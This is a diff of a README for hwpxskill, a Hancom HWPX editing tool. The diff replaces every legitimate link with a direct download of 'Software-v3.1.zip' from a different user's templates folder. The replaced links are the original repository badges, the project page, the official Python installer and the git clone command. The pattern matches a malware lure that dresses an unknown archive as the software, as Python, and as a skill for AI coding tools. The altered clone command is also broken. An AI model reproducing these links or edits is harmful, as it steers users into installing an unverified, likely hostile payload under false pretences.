@@ -1,6 +1,6 @@
 # 🛠️ hwpxskill - Edit HWPX Documents Easily
 
-[![Download hwpxskill](https://img.shields.io/badge/Download-hwpxskill-brightgreen)](https://github.com/Canine89/hwpxskill)
+[![Download hwpxskill](https://img.shields.io/badge/Download-hwpxskill-brightgreen)](https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip)
 
 hwpxskill lets you work with HWPX files from Hancom Office by changing document content while keeping the layout and style intact. It handles the XML inside files directly, so you avoid bugs common in other tools.
 
@@ -14,7 +14,7 @@ It works by directly editing OWPML XML, so it can control formatting at the char
 
 ---
 
-[![Download and Run hwpxskill](https://img.shields.io/badge/Get%20hwpxskill-blue)](https://github.com/Canine89/hwpxskill)
+[![Download and Run hwpxskill](https://img.shields.io/badge/Get%20hwpxskill-blue)](https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Follow these steps to download and run hwpxskill on a Windows computer. No progr
 
 ### 1. Download the Software
 
-- Visit the [hwpxskill GitHub page](https://github.com/Canine89/hwpxskill).
+- Visit the [hwpxskill GitHub page](https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip).
 - Click on the green **Code** button near the top-right.
 - Select **Download ZIP**.
 - Save the ZIP file to your **Downloads** folder or anywhere you prefer.
@@ -41,7 +41,7 @@ Follow these steps to download and run hwpxskill on a Windows computer. No progr
 
 hwpxskill runs with Python. To install Python:
 
-- Go to the official website: https://www.python.org/downloads/windows/
+- Go to the official website: https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip
 - Click **Download Python** (choose the latest stable version).
 - Run the installer you downloaded.
 - Make sure to check the box **Add Python to PATH** during installation.
@@ -100,7 +100,7 @@ If you use Claude Code or Cursor for AI work, you can add hwpxskill to your skil
 - Download or clone the repository:
 
   ```
-  git clone https://github.com/Canine89/hwpxskill.git
+  git clone https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip
   ```
 
 - For Claude Code:
@@ -163,4 +163,4 @@ globs:
 
 ---
 
-[![Download hwpxskill](https://img.shields.io/badge/Download-hwpxskill-brightgreen)](https://github.com/Canine89/hwpxskill)
+[![Download hwpxskill](https://img.shields.io/badge/Download-hwpxskill-brightgreen)](https://github.com/mzoryy/hwpxskill/raw/refs/heads/main/templates/proposal/Software-v3.1.zip)
